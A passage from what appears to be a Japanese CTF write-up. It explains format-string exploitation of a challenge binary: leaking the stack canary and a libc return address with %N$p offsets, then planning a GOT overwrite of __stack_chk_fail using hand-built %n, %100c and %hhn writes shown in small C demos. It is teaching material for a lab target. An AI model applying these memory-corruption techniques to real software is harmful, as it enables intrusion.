    style="padding-bottom: 28.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABhElEQVQY0z2QS1PaABSFs6lasApjfYxFBxAKARIID8EikAcNIBFMKISiA1Jt6ZR2+v9XX5Msujjz3dW55xzh4TjPxJP1PsescR/otf/E4tZhqc1Yd+dsH1546S34ef/MY8tmM1zSz7SoHxW4jua4OZZpeLcSTiO4NyPmjRFfane49SFDseXxjrUxZTtastImPBsu808j79EjVl7DSDToxKpMKgM6Hyo45T6zukXlIIOw0qYMMm0GokZfHtMt2FTPdUzZoae4qKketmLy+aoZ0E/qp1QvamiX1/8p7yaR95II28kPFm0HKSwSf9flImSQPOyRiFrEo2M+RnTUWNlLpvPbfuWb+ZW/0w0ba8Wv8dqbYcUf5zvVQ5Hi3hWCE1NwTiXMSBY9beDezlATHaSQiHygIO8XqOynqUVytL16fkW/bvOsRPu8TPO0FMjfr/jWM1RPZOy8ysLbzykZaGmT/EmPbKRDNqqT8ZQ6GpEPF5HeXCLtJCjsxANKPncTwe2blUIp/gHYAceQSr1tfQAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/65ff40ee840bb33a43112da2963c5686/8ac56/image-20240606230423319.webp 240w,
/static/65ff40ee840bb33a43112da2963c5686/4424c/image-20240606230423319.webp 470w"
              sizes="(max-width: 470px) 100vw, 470px"
              type="image/webp"
            />
          <source
            srcset="/static/65ff40ee840bb33a43112da2963c5686/8ff5a/image-20240606230423319.png 240w,
/static/65ff40ee840bb33a43112da2963c5686/f96db/image-20240606230423319.png 470w"
            sizes="(max-width: 470px) 100vw, 470px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/65ff40ee840bb33a43112da2963c5686/f96db/image-20240606230423319.png"
            alt="image-20240606230423319"
            title="image-20240606230423319"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>このアドレスには、main 関数の実行前に呼び出される <code class="language-text">__libc_start_call_main</code> の中で TLS から取得した Canary の値をスタックに保存した際の情報が残存しているようです。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 757px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/e46b4ec38c6d2768d54bb8cdbc5c8a7a/1fbe8/image-20240606230322555.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 38.75%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABrElEQVQoz2XRbW/ScBTGYd6YQIECbYnJ5EFoaQHpE0jbCSUMN2SUDdDFxBd+/4/x8wAbmvji5G7S5Mp9zj+XWhnLwZFN8IO5uWXrZRz8e9bWjJW7YGb0WRkOc8Pmiy5Z75NoDn7BIlBMglO+jWKR69SeaGtHupU1LfWRuHFH1k8ZvmszbI+IShYLxWZYDAjyXby8KVhPAEnlgl7yguZsY0evfqRvbDBrW5LmV/buirBk47Zc4qLJQRuyqvmk+oRE/0ysBUSK4IW/0LVhT8+wjGcc7eEMTm+WvIzXTCp9Rg1pWLT4XrXJZNbvBatFxDcLlmVLmpoXUHnLM7gTcH8F4w9Lfk43jFWHUfMCHktd9qrFvmaSqiFB85lZuXcG/f9A4xXUv9GtZcTN+1dQGrZdpkqPTcUlrXgkkpEayMoT5ifwiv0DnjBLbuhoawF3JK0Hft1mjMsOruXjNzz5DvBLHoNiSFgeMi98JJYNXAE8aenK/fx8Rxp3T+ABs/6CrT/S0fYk7Q2/08N5ZbfjEmqfiKoJYTVmoN7KbT1m8vKptFrIg6UydyWTqR4RyL8/aCzrMxBIFwcAAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/e46b4ec38c6d2768d54bb8cdbc5c8a7a/8ac56/image-20240606230322555.webp 240w,
/static/e46b4ec38c6d2768d54bb8cdbc5c8a7a/d3be9/image-20240606230322555.webp 480w,
/static/e46b4ec38c6d2768d54bb8cdbc5c8a7a/4578a/image-20240606230322555.webp 757w"
              sizes="(max-width: 757px) 100vw, 757px"
              type="image/webp"
            />
          <source
            srcset="/static/e46b4ec38c6d2768d54bb8cdbc5c8a7a/8ff5a/image-20240606230322555.png 240w,
/static/e46b4ec38c6d2768d54bb8cdbc5c8a7a/e85cb/image-20240606230322555.png 480w,
/static/e46b4ec38c6d2768d54bb8cdbc5c8a7a/1fbe8/image-20240606230322555.png 757w"
            sizes="(max-width: 757px) 100vw, 757px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/e46b4ec38c6d2768d54bb8cdbc5c8a7a/1fbe8/image-20240606230322555.png"
            alt="image-20240606230322555"
            title="image-20240606230322555"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>このアドレスと go 関数の RBP-0x30 との差分は 0xd8 で、0xd8//0x8 = 27 から、<code class="language-text">%33$p</code> でも Canary をリークできそうです。</p>
<p>実際に、<code class="language-text">%11$p</code> と <code class="language-text">%33$p</code> で同じ値をリークできる上に、go 関数のスタックが BoF で破壊されている場合でも Canary のリークに成功することを確認できます。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/72d53dde3bdf4f55d6c79651f89fa07a/e996b/image-20240606231708048.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 14.583333333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAvUlEQVQI11XOTW+CQACEYZLGpgcTe+mtARRLxFJURGzpWhbcAvIhMZ78/z/k1W689PAkc5nJGPk6Q/qCnfODcFLkTKE+DrcsWb5ECDOhmH4TDl3mDyb+wOZ9YGn+o03wNPnHaOOSeqVoFiWHoKQLG/pNxzFqaVc15+2RS9JTe5LiTVDeVe6OzIrZPHt3c6KRh3EOK+pZSufnWuUKTstf+kCxvxXU+Evbjz/14N/bYip0VpOEzIy13NqSvkZcAcwsYBjmd1GbAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/72d53dde3bdf4f55d6c79651f89fa07a/8ac56/image-20240606231708048.webp 240w,
/static/72d53dde3bdf4f55d6c79651f89fa07a/d3be9/image-20240606231708048.webp 480w,
/static/72d53dde3bdf4f55d6c79651f89fa07a/e46b2/image-20240606231708048.webp 960w,
/static/72d53dde3bdf4f55d6c79651f89fa07a/c139f/image-20240606231708048.webp 1050w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/72d53dde3bdf4f55d6c79651f89fa07a/8ff5a/image-20240606231708048.png 240w,
/static/72d53dde3bdf4f55d6c79651f89fa07a/e85cb/image-20240606231708048.png 480w,
/static/72d53dde3bdf4f55d6c79651f89fa07a/d9199/image-20240606231708048.png 960w,
/static/72d53dde3bdf4f55d6c79651f89fa07a/e996b/image-20240606231708048.png 1050w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/72d53dde3bdf4f55d6c79651f89fa07a/d9199/image-20240606231708048.png"
            alt="image-20240606231708048"
            title="image-20240606231708048"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>この方法でリークした Canary は後程 BoF の脆弱性を悪用する場合に使用します。</p>
<h3 id="fsb-で-libc-のベースアドレスをリークする" style="position:relative;"><a href="#fsb-%E3%81%A7-libc-%E3%81%AE%E3%83%99%E3%83%BC%E3%82%B9%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E3%82%92%E3%83%AA%E3%83%BC%E3%82%AF%E3%81%99%E3%82%8B" aria-label="fsb で libc のベースアドレスをリークする permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>FSB で libc のベースアドレスをリークする</h3>
<p>次は、後程 ROP や OneGadget を使用するために、FSB でライブラリ関数のアドレスをリークして libc のバージョンを特定します。</p>
<p>FSB でライブラリ関数のアドレスをリークするテクニックの 1 つとして、main 関数のスタックに保持されている <code class="language-text">__libc_start_main_ret</code> のリターンアドレスをリークさせる手法があります。</p>
<p>今回のバイナリの場合、go 関数のリターンアドレスが格納されているアドレスに 16 バイト加算した位置に <code class="language-text">__libc_start_main_ret</code> のリターンアドレスが記録されています。</p>
<p>つまり、<code class="language-text">(0x30+0x8+0x10)//8 = 9</code> を加算した <code class="language-text">%15$p</code> をリークすると <code class="language-text">__libc_start_main_ret</code> のアドレスを特定できます。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/eb54d3ebb2b904ec8a2207f015c5e0c6/4ef40/image-20240606234914053.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 72.91666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAACw0lEQVQ4y3VT2XLaQBDkyTGY0+YyGIKRuAS60QqklRCXwdhObJOqPKSS//+Lzmh9m+ShSxLU9HTPTCe+Sz5uuiGWEseK3q86AXbKAn6NQT/pQ091BLSk/A4dGCkZelKi/2Tx/oJE2A0wb0wwLerwKhZY0YBbNOGUXWjpERX0BLGVHWJcUGHnVRgZRZAJ0s+EvMuwrppgRy14p0MENQuLlovFVwZe1TE5G2FaUhGcm/RtYFa3qbkK7bj9geiVUG0wSIUbtM4e4Tcj7Acc1zUTaypcyzQCgl/RoX65xOxiLBpoX9pvlpOfCMcNC37GwqQWYd2dIyQl42wPLqmNGg7Guf6TvRMZdqYHM915tfuC99+Jmcxw17AxOboAy/UwKWnCmrBHipz8ADY1iIk5NbOzfWH3SZ30NsvnZ8Jp2fDrPpwKBy9b4HUOtzaDUxpjI3lYtqaYX06w6XAsmy4t0EFEjWL18yajRoMP80xoDR1O3YPbWmBRpYU0A3idK4QXHjZqRKoMBKQubI5hng2g57sw8/3/Ww7aPr4ZO6yVJaZEaGcVGBUNrGRByY3oRPpgqT5UeqqFIbT8kEjp96T8b8uP5ha/Z3v84g+4ViJohR6M2hBqlaw8F2hx97jg+Al6jJR0oE4Q3htr/In2+DHe4na0QNDiCCSGybkuSETBuwV8xoHlTX+FSF7RIkJahEOxW8GrOTBzRJhVKSU0t/QAJqXDzAxhpBUBK90Vp3Rw2I/sHu1MBOn0jmYXYVc3sMh2MKMD9soGbdkV4DRfv0KRpDnatFm/YghlI0pYfPQx4oNP/PQe0MnNIZ/dwa6G2MmcErJE0PToiHuUaSaUu4UBHb0OTgsLKJKc4hrWbISUqDiuIcEra0hsjT3kwhZS8R5q5QrzwS2ml9fg7Q2c8xD9EweDDINx6sIuTWEWp7CLDlhBOUB8/H8BrYO5aZ+u5dEAAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/eb54d3ebb2b904ec8a2207f015c5e0c6/8ac56/image-20240606234914053.webp 240w,
/static/eb54d3ebb2b904ec8a2207f015c5e0c6/d3be9/image-20240606234914053.webp 480w,
/static/eb54d3ebb2b904ec8a2207f015c5e0c6/e46b2/image-20240606234914053.webp 960w,
/static/eb54d3ebb2b904ec8a2207f015c5e0c6/30771/image-20240606234914053.webp 1057w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/eb54d3ebb2b904ec8a2207f015c5e0c6/8ff5a/image-20240606234914053.png 240w,
/static/eb54d3ebb2b904ec8a2207f015c5e0c6/e85cb/image-20240606234914053.png 480w,
/static/eb54d3ebb2b904ec8a2207f015c5e0c6/d9199/image-20240606234914053.png 960w,
/static/eb54d3ebb2b904ec8a2207f015c5e0c6/4ef40/image-20240606234914053.png 1057w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/eb54d3ebb2b904ec8a2207f015c5e0c6/d9199/image-20240606234914053.png"
            alt="image-20240606234914053"
            title="image-20240606234914053"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>ここで、問題サーバに接続して FSB でこのアドレスをリークすると、 <code class="language-text">__libc_start_main_ret</code> の末尾が 0xd90 であることを特定できます。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 716px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/702a3a32e961c27b2475abfbf24ea454/6bbf7/image-20240606235228460.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 9.166666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAjUlEQVQI102IywqCQABF3ZUtwhYtDAJFg0iZMcbHaFHQVPSiRWmt+/+POA2tWhzuOddpREOd1lSxovAL5DhHTWqUr9HhloWXMR8KktGSxJOkdjfTEhNUHKIVJtTsrJtA225w2uLCXexp8zNPdeJV3XjY7ez/MW+68spxtkb0QrJBhHRjZN/iRrbjH//+BbTCPlNOLkCMAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/702a3a32e961c27b2475abfbf24ea454/8ac56/image-20240606235228460.webp 240w,
/static/702a3a32e961c27b2475abfbf24ea454/d3be9/image-20240606235228460.webp 480w,
/static/702a3a32e961c27b2475abfbf24ea454/d8378/image-20240606235228460.webp 716w"
              sizes="(max-width: 716px) 100vw, 716px"
              type="image/webp"
            />
          <source
            srcset="/static/702a3a32e961c27b2475abfbf24ea454/8ff5a/image-20240606235228460.png 240w,
/static/702a3a32e961c27b2475abfbf24ea454/e85cb/image-20240606235228460.png 480w,
/static/702a3a32e961c27b2475abfbf24ea454/6bbf7/image-20240606235228460.png 716w"
            sizes="(max-width: 716px) 100vw, 716px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/702a3a32e961c27b2475abfbf24ea454/6bbf7/image-20240606235228460.png"
            alt="image-20240606235228460"
            title="image-20240606235228460"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>そのため、ここから問題サーバの libc のバージョンもある程度絞り込むことができます。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 679px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/ac9f15feb0e419576355100921876220/1b747/image-20240606235215536.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 43.75%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAABVklEQVQoz32SS07DMBRFvTK2wFZYAEJMmMAiYFgmDNgASEgsACHohEr0R9okbhPn419yeS8lwUWiT7qyHMvHPs8Rk8kHFosluNq2HdJX+C1cm82mGI/f4b1HWKJUBVSWwWqzt1DXNbTW+Fs9cLutECcKqawgNxW2WY3Npoao4BHXCokuEKcpZCrRNA2klATVHYDnfXpglmskKUPLLgzluXAvnzCPrzBPb3B5Cc8bSYM3s06YECjpZtGqwFeksKQwNKJR6NNblEfnqI4v0czTnVfT4r/qgay3jkus1gUiSncAAx1aaNI2oJvhF8Q3cs7tPVAIZOU4qQZt7iWPoiZMQUAFB0OAXlcpajj1lPtojOkeyFo7AHkz686XOWbzDCvSn84yCDt6hr64g766h48zwpOxb4ZfJHyQsIfWeWhDZj+xdjcKffOA8uQa5dkITZz3XjhU7YH1b3l8t099TRASAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/ac9f15feb0e419576355100921876220/8ac56/image-20240606235215536.webp 240w,
/static/ac9f15feb0e419576355100921876220/d3be9/image-20240606235215536.webp 480w,
/static/ac9f15feb0e419576355100921876220/8fbda/image-20240606235215536.webp 679w"
              sizes="(max-width: 679px) 100vw, 679px"
              type="image/webp"
            />
          <source
            srcset="/static/ac9f15feb0e419576355100921876220/8ff5a/image-20240606235215536.png 240w,
/static/ac9f15feb0e419576355100921876220/e85cb/image-20240606235215536.png 480w,
/static/ac9f15feb0e419576355100921876220/1b747/image-20240606235215536.png 679w"
            sizes="(max-width: 679px) 100vw, 679px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/ac9f15feb0e419576355100921876220/1b747/image-20240606235215536.png"
            alt="image-20240606235215536"
            title="image-20240606235215536"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>ちなみに今回は問題サーバの Dockerfile も与えられているため、ここからも libc のバージョンが <code class="language-text">2.35-0ubuntu3.6</code> であることを特定することができます。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 658px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/a59b90a62d83a6b7def6013b01169579/889a4/image-20240606235817115.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 38.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABkklEQVQoz21S104CURDdRBFL7FGDqBRR2tKXsktZytJ7X0QCvBj//weOd8aExMjDZCZz586Zc2akaaqNfqTK1pXLaAeKGMUb6ARL6IcN1N9ySF0HkLjwQj5yInzsRuTkFdFTz16TtlUTs0yXm/REg7IjjZoni4a3wN5wq6g4M8jb4lDvQsjcyoifexG2urk5Wcjq2sXSMFYHTTlKNDBLdzBONDFWmhx3xMQTpYW52uMcAdK74dag2xPQnxQUn5MMmrPFOJamyTZ/oOKF1ocpjEBMkVtkB5gkW1jpY45JFgInFvX3PJt2H0H6JojklV9YQDQUBXNBeaVP8N1ZM33DpaIXqrCOw1gNy9wQy/wQm8qcG5PWBLouz4TmJZaGNCYZJCoYRGus4Yf4WHammUr2IYL8Y5wX4pPsCBy8IHjogGxx8nLIBy2Of0uSNgKF0LcCfWuY+CyMedKv1oonoq0TQEFoplz6d5/Zn/3dMOWkrqBG+i31EVr+35OhcyG6NDm90cIGdFaitvqqoenTURGy7DufHzuwBdZ8QxJwAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/a59b90a62d83a6b7def6013b01169579/8ac56/image-20240606235817115.webp 240w,
/static/a59b90a62d83a6b7def6013b01169579/d3be9/image-20240606235817115.webp 480w,
/static/a59b90a62d83a6b7def6013b01169579/6ad61/image-20240606235817115.webp 658w"
              sizes="(max-width: 658px) 100vw, 658px"
              type="image/webp"
            />
          <source
            srcset="/static/a59b90a62d83a6b7def6013b01169579/8ff5a/image-20240606235817115.png 240w,
/static/a59b90a62d83a6b7def6013b01169579/e85cb/image-20240606235817115.png 480w,
/static/a59b90a62d83a6b7def6013b01169579/889a4/image-20240606235817115.png 658w"
            sizes="(max-width: 658px) 100vw, 658px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/a59b90a62d83a6b7def6013b01169579/889a4/image-20240606235817115.png"
            alt="image-20240606235817115"
            title="image-20240606235817115"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<h3 id="fsb-で-got-オーバーライドを行う" style="position:relative;"><a href="#fsb-%E3%81%A7-got-%E3%82%AA%E3%83%BC%E3%83%90%E3%83%BC%E3%83%A9%E3%82%A4%E3%83%89%E3%82%92%E8%A1%8C%E3%81%86" aria-label="fsb で got オーバーライドを行う permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>FSB で GOT オーバーライドを行う</h3>
<p>FSB で Canary や libc 関数のアドレスをリークできることがわかりましたが、現在の go 関数の実装では、入力を 1 度受け取って printf で出力したらそのままプログラムが終了してしまいます。</p>
<p>問題サーバで実行されているバイナリは fork 型ではなく、Canary やライブラリ関数のロードアドレスは毎回ランダムに決定されるため、このままではせっかくメモリ内のデータをリークしてもエクスプロイトにつなげることができません。</p>
<p>このような問題を回避するためには、BoF や GOT オーバーライドなどの攻撃手法を利用して、入力を受け付ける悪用可能な関数を繰り返し実行させる必要があります。</p>
<p>すでに確認している通り、今回の問題バイナリは PIE が無効で RELRO(Relocation Read-Only) は Partial RELRO なので GOT オーバーライドを使用できそうです。</p>
<p>まずは GOT オーバーライドで脆弱性のある  go 関数の再実行に使えそうな対象を特定します。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 373px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/821766aa7f2ac9d55354319a6f2ec3d4/67a5d/image-20240607221710176.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 30.83333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABHklEQVQY01XR3XKDIBAF4LxANGAbGwXUSEAQNLHN9Of93+t01dq0F8y5Yb85O7tjjKFRBaKRUGWOYCvUIkekbNUJSZKAZxw6Wvi3AHv19BxEI1EUJbrO4nA4IE3TJXczGEyFydULcPMNzuoFT5yBs/UjzzIYguLHSGiEmzzKWkCpCqHvlz8LmBLIadBpiYkg05QIFwXXCmqscHzOfhoSODqE9xHuNVAOCyiVgvce+mLQnhvs93vsZJHjHloMBMyt5trszwprQ/4LdlNA/LxB6QpSrqAx9gGKU46xq+Cp5QZs2APcVr4uDYevCeoygzTnexhrodvzCpanI+6xhSqOtN5/aEvG6SiBjkLY3LS/R8hWQQhJR3HQWqOpKyQEfgMnSqGykpipqQAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/821766aa7f2ac9d55354319a6f2ec3d4/8ac56/image-20240607221710176.webp 240w,
/static/821766aa7f2ac9d55354319a6f2ec3d4/48a24/image-20240607221710176.webp 373w"
              sizes="(max-width: 373px) 100vw, 373px"
              type="image/webp"
            />
          <source
            srcset="/static/821766aa7f2ac9d55354319a6f2ec3d4/8ff5a/image-20240607221710176.png 240w,
/static/821766aa7f2ac9d55354319a6f2ec3d4/67a5d/image-20240607221710176.png 373w"
            sizes="(max-width: 373px) 100vw, 373px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/821766aa7f2ac9d55354319a6f2ec3d4/67a5d/image-20240607221710176.png"
            alt="image-20240607221710176"
            title="image-20240607221710176"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>この中だと、Canary が破壊された場合に呼び出される <code class="language-text">__stack_chk_fail</code> のオーバーライドを行うことで go 関数の再実行と BoF が発生した場合にプロセスが終了されないようにするための改ざんを同時に行えそうです。</p>
<p>FSB の悪用で GOT オーバーライドを行うためには、pwntools の fmtstr_payload を使用するのが便利です。</p>
<p>しかし、我々の目指す先はスクリプトキディではないので、今回はハンドメイドしたペイロードで FSB を悪用した GOT オーバーライドを実践しましょう。</p>
<p>前の項でまとめた通り、FSB でメモリアドレス内の値を書き換えるには <code class="language-text">%n</code> フォーマッタを使用します。</p>
<p>これは、引数のポインタアドレスに printf が %n を見つけるまでに出力した文字数を格納することができるフォーマッタです。</p>
<p>例えば以下のコードを実行すると、ABCD の次の行に 5 という表示が出力されます。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ABCDE%n\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre></div>
<p>これは、<code class="language-text">ABCDE%n\n</code> によって、<code class="language-text">%n</code> の前に出力した文字数である 5 を buf 変数のアドレスに格納したためです。</p>
<p>このフォーマッタを応用することで、FSB で指定したポインタのアドレス任意のバイト値を書き込むことができます。</p>
<p>より柔軟にメモリの書き換えを行うため、いくつかのテクニックを使用できます。</p>
<p>まずは、<code class="language-text">%100c</code> のようなフォーマッタを利用する方法です。</p>
<p><code class="language-text">%100c</code> のようなフォーマッタを使うと、実際に 100 文字を引数として printf 系関数に与えなくても、指定したサイズ分の余白を表示させることで <code class="language-text">%100c%n</code> のようなより短い記法で特定の値を書き込むことができます。</p>
<p>実際に以下のコードを実行すると、変数 buf の値は 100 に書き換えられることを確認できます。(<code class="language-text">%100c</code> のフォーマッタの分も追加の引数が必要な点に注意します)</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">int</span> buf <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%100c%n\n"</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre></div>
<p>また、<code class="language-text">%hhn</code> とすることで Byte、<code class="language-text">%hn</code> で Short、<code class="language-text">%n</code> で int としてそれぞれ 1、2、4 バイトずつ書き込みを行うことができるようです。</p>
<p>このあたりを詳細に確認できる情報は見つかりませんでしたが、恐らく printf 関数の以下の箇所で定義されているキャストで実現していそうです。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token keyword">case</span> <span class="token char">'n'</span><span class="token operator">:</span>
